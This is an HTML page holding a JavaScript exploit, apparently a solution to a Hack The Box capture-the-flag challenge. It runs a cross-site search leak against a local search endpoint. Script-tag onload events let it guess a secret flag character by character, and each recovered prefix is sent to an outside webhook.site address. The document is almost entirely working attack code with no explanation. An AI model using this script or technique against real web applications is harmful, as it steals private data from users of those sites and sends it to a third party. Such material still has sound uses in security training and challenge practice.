<!DOCTYPE html>
<body>
    <script>
    var whook = 'https://webhook.site/68ffd931-c944-4cd1-9be3-46966e1ace9b/'
    var url = "http://127.0.0.1:1338/api/entries/search?q=";
    var htb = 'HTB';
    var letters = '';
    var FLAG = 'HTB{';
    // flag characters
    for(var i=33; i<127; i++){
        letters += String.fromCharCode(i);
    }
        
    async function makeFetchRequest() {
        for(var i=0; i<letters.length; i++){
            await doGuess(letters[i]);
        }
    }

        
    async function doGuess(g){
        const script = document.createElement("script");
        script.src = url+FLAG+g;
        script.onload = () => {
          FLAG += g;
          setTimeout(() => {
            fetch(whook + FLAG);
            makeFetchRequest();
          }, 10);
        };
        //script.onerror = () => {fetch(whook+g+'Fail')};
        document.head.appendChild(script);
    }
    makeFetchRequest();

    </script>
</body>
